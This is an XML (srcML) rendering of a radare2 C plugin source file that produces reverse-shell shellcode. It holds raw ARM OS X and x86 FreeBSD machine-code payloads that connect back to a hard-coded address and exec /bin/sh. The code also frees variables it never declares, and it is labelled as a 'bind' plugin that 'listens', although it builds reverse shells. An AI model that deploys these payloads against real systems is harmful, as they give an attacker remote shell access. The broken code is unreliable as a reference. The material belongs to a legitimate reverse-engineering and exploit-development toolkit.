<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<unit xmlns="http://www.srcML.org/srcML/src" xmlns:cpp="http://www.srcML.org/srcML/cpp" revision="1.0.0" language="C" filename="D:\Pesquisa\Projects\radare2-analysis\_cppstats\radare2\libr\egg\p\egg_reverse.c"><cpp:include>#<cpp:directive>include</cpp:directive> <cpp:file>&lt;r_egg.h&gt;</cpp:file></cpp:include>

<decl_stmt><decl><type><name>unsigned</name> <name>long</name></type> <name><name>armle_osx_reverse</name><index>[]</index></name><init>= <expr><block>{

<expr><literal type="number">0xe3a00002</literal></expr>, <expr><literal type="number">0xe3a01001</literal></expr>, <expr><literal type="number">0xe3a02006</literal></expr>, <expr><literal type="number">0xe3a0c061</literal></expr>, <expr><literal type="number">0xef000080</literal></expr>, <expr><literal type="number">0xe1a0a000</literal></expr>, <expr><literal type="number">0xeb000001</literal></expr>,

<expr><literal type="number">0x5c110200</literal></expr>, 

<expr><literal type="number">0x8700a8c0</literal></expr>, 

<expr><literal type="number">0xe1a0000a</literal></expr>, <expr><literal type="number">0xe1a0100e</literal></expr>, <expr><literal type="number">0xe3a02010</literal></expr>, <expr><literal type="number">0xe3a0c062</literal></expr>, <expr><literal type="number">0xef000080</literal></expr>,

<expr><literal type="number">0xe3a05002</literal></expr>, <expr><literal type="number">0xe3a0c05a</literal></expr>, <expr><literal type="number">0xe1a0000a</literal></expr>, <expr><literal type="number">0xe1a01005</literal></expr>, <expr><literal type="number">0xef000080</literal></expr>,

<expr><literal type="number">0xe2455001</literal></expr>, <expr><literal type="number">0xe3550000</literal></expr>, <expr><literal type="number">0xaafffff8</literal></expr>, <expr><literal type="number">0xe3a00000</literal></expr>, <expr><literal type="number">0xe3a01001</literal></expr>,

<expr><literal type="number">0xe3a0c07e</literal></expr>, <expr><literal type="number">0xef000080</literal></expr>, <expr><literal type="number">0xe0455005</literal></expr>, <expr><literal type="number">0xe1a0600d</literal></expr>, <expr><literal type="number">0xe24dd020</literal></expr>,

<expr><literal type="number">0xe28f0014</literal></expr>, <expr><literal type="number">0xe4860000</literal></expr>, <expr><literal type="number">0xe5865004</literal></expr>, <expr><literal type="number">0xe1a01006</literal></expr>, <expr><literal type="number">0xe3a02000</literal></expr>,

<expr><literal type="number">0xe3a0c03b</literal></expr>, <expr><literal type="number">0xef000080</literal></expr>,

<expr><literal type="number">0x6e69622f</literal></expr>, <expr><literal type="number">0x0068732f</literal></expr> }</block></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><name>unsigned</name> <name>char</name></type> <name><name>x86_freebsd_reverse</name><index>[]</index></name> <init>=

<expr><literal type="string">"\xeb\x68\x5e\x31\xc0\x31\xdb\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x53\xb0\x61"</literal>

<literal type="string">"\xcd\x80\x89\xc2\xc6\x46\x01\x02\x66\xc7\x46\x02\x69\x7a\xb3\x10\x53\x8d\x1e"</literal>

<literal type="string">"\x53\x50\x50\xb0\x62\xcd\x80\x31\xdb\x53\x52\xb0\x5a\x50\xcd\x80\xfe\xc3\x53"</literal>

<literal type="string">"\x52\xb0\x5a\x50\xcd\x80\xfe\xc3\x53\x52\xb0\x5a\x50\xcd\x80\x31\xdb\x53\x8d"</literal>

<literal type="string">"\x7e\x0f\x31\xc0\x31\xc9\xb1\x09\xf3\xaa\x8d\x5e\x08\x89\x5e\x10\x8d\x4e\x10"</literal>

<literal type="string">"\x51\x53\x50\xb0\x3b\xcd\x80\xb0\x01\xcd\x80\xe8\x93\xff\xff\xff\x41\x42\x43"</literal>

<literal type="string">"\x43\x7f\x00\x00\x01\x2f\x62\x69\x6e\x2f\x73\x68"</literal></expr></init></decl>;</decl_stmt>

<function><type><specifier>static</specifier> <name>RBuffer</name> <modifier>*</modifier></type><name>build</name> <parameter_list>(<parameter><decl><type><name>REgg</name> <modifier>*</modifier></type><name>egg</name></decl></parameter>)</parameter_list> <block>{<block_content>

<decl_stmt><decl><type><name>RBuffer</name> <modifier>*</modifier></type><name>buf</name> <init>= <expr><call><name>r_buf_new</name> <argument_list>()</argument_list></call></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><specifier>const</specifier> <name>ut8</name> <modifier>*</modifier></type><name>sc</name> <init>= <expr><name>NULL</name></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><name>int</name></type> <name>cd</name> <init>= <expr><literal type="number">0</literal></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><name>char</name> <modifier>*</modifier></type><name>port</name> <init>= <expr><call><name>r_egg_option_get</name> <argument_list>(<argument><expr><name>egg</name></expr></argument>, <argument><expr><literal type="string">"port"</literal></expr></argument>)</argument_list></call></expr></init></decl>;</decl_stmt>

<switch>switch <condition>(<expr><name><name>egg</name><operator>-&gt;</operator><name>os</name></name></expr>)</condition> <block>{<block_content>

<case>case <expr><name>R_EGG_OS_OSX</name></expr>:</case>

<case>case <expr><name>R_EGG_OS_DARWIN</name></expr>:</case>

<switch>switch <condition>(<expr><name><name>egg</name><operator>-&gt;</operator><name>arch</name></name></expr>)</condition> <block>{<block_content>

<case>case <expr><name>R_SYS_ARCH_ARM</name></expr>:</case>

<expr_stmt><expr><name>sc</name> <operator>=</operator> <name>armle_osx_reverse</name></expr>;</expr_stmt>

<expr_stmt><expr><name>cd</name> <operator>=</operator> <literal type="number">7</literal><operator>+</operator><literal type="number">36</literal></expr>;</expr_stmt>

<break>break;</break>

</block_content>}</block></switch>

<break>break;</break>

<case>case <expr><name>R_EGG_OS_FREEBSD</name></expr>:</case>

<switch>switch <condition>(<expr><name><name>egg</name><operator>-&gt;</operator><name>arch</name></name></expr>)</condition> <block>{<block_content>

<case>case <expr><name>R_SYS_ARCH_X86</name></expr>:</case>

<switch>switch <condition>(<expr><name><name>egg</name><operator>-&gt;</operator><name>bits</name></name></expr>)</condition> <block>{<block_content>

<case>case <expr><literal type="number">32</literal></expr>:</case> <expr_stmt><expr><name>sc</name> <operator>=</operator> <name>x86_freebsd_reverse</name></expr>;</expr_stmt> <break>break;</break>

<default>default:</default> <expr_stmt><expr><call><name>eprintf</name> <argument_list>(<argument><expr><literal type="string">"Unsupportted\n"</literal></expr></argument>)</argument_list></call></expr>;</expr_stmt>

</block_content>}</block></switch>

<break>break;</break>

</block_content>}</block></switch>

<break>break;</break>

<default>default:</default>

<expr_stmt><expr><call><name>eprintf</name> <argument_list>(<argument><expr><literal type="string">"unsupported os %x\n"</literal></expr></argument>, <argument><expr><name><name>egg</name><operator>-&gt;</operator><name>os</name></name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

<break>break;</break>

</block_content>}</block></switch>

<if_stmt><if>if <condition>(<expr><name>sc</name></expr>)</condition> <block>{<block_content>

<expr_stmt><expr><call><name>r_buf_set_bytes</name> <argument_list>(<argument><expr><name>buf</name></expr></argument>, <argument><expr><name>sc</name></expr></argument>, <argument><expr><call><name>strlen</name> <argument_list>(<argument><expr><operator>(</operator><specifier>const</specifier> <name>char</name> <operator>*</operator><operator>)</operator><name>sc</name></expr></argument>)</argument_list></call></expr></argument>)</argument_list></call></expr>;</expr_stmt>

<if_stmt><if>if <condition>(<expr><name>shell</name> <operator>&amp;&amp;</operator> <operator>*</operator><name>shell</name></expr>)</condition> <block>{<block_content>

<if_stmt><if>if <condition>(<expr><name>cd</name></expr>)</condition><block type="pseudo"><block_content> <expr_stmt><expr><call><name>r_buf_write_at</name> <argument_list>(<argument><expr><name>buf</name></expr></argument>, <argument><expr><name>cd</name></expr></argument>, <argument><expr><operator>(</operator><specifier>const</specifier> <name>ut8</name><operator>*</operator><operator>)</operator><name>shell</name></expr></argument>, <argument><expr><call><name>strlen</name> <argument_list>(<argument><expr><name>shell</name></expr></argument>)</argument_list></call><operator>+</operator><literal type="number">1</literal></expr></argument>)</argument_list></call></expr>;</expr_stmt></block_content></block></if>

<else>else<block type="pseudo"><block_content> <expr_stmt><expr><call><name>eprintf</name> <argument_list>(<argument><expr><literal type="string">"Cannot set shell\n"</literal></expr></argument>)</argument_list></call></expr>;</expr_stmt></block_content></block></else></if_stmt>

</block_content>}</block></if></if_stmt>

</block_content>}</block></if></if_stmt>

<expr_stmt><expr><call><name>free</name> <argument_list>(<argument><expr><name>suid</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

<expr_stmt><expr><call><name>free</name> <argument_list>(<argument><expr><name>shell</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

<return>return <expr><name>buf</name></expr>;</return>

</block_content>}</block></function>

<decl_stmt><decl><type><name>REggPlugin</name></type> <name>r_egg_plugin_bind</name> <init>= <expr><block>{

<expr><operator>.</operator><name>name</name> <operator>=</operator> <literal type="string">"bind"</literal></expr>,

<expr><operator>.</operator><name>type</name> <operator>=</operator> <name>R_EGG_PLUGIN_SHELLCODE</name></expr>,

<expr><operator>.</operator><name>desc</name> <operator>=</operator> <literal type="string">"listen port=4444"</literal></expr>,

<expr><operator>.</operator><name>build</name> <operator>=</operator> <operator>(</operator><name>void</name> <operator>*</operator><operator>)</operator><name>build</name></expr>

}</block></expr></init></decl>;</decl_stmt>

<cpp:if>#<cpp:directive>if</cpp:directive> <expr><operator>!</operator><call><name>defined</name><argument_list>(<argument><expr><name>R2_PLUGIN_INCORE</name></expr></argument>)</argument_list></call></expr></cpp:if>
<decl_stmt><decl><type><name>R_API</name> <name>RLibStruct</name></type> <name>radare_plugin</name> <init>= <expr><block>{

<expr><operator>.</operator><name>type</name> <operator>=</operator> <name>R_LIB_TYPE_EGG</name></expr>,

<expr><operator>.</operator><name>data</name> <operator>=</operator> <operator>&amp;</operator><name>r_egg_plugin_bind</name></expr>,

<expr><operator>.</operator><name>version</name> <operator>=</operator> <name>R2_VERSION</name></expr>

}</block></expr></init></decl>;</decl_stmt>

<cpp:endif>#<cpp:directive>endif</cpp:directive></cpp:endif>

</unit>
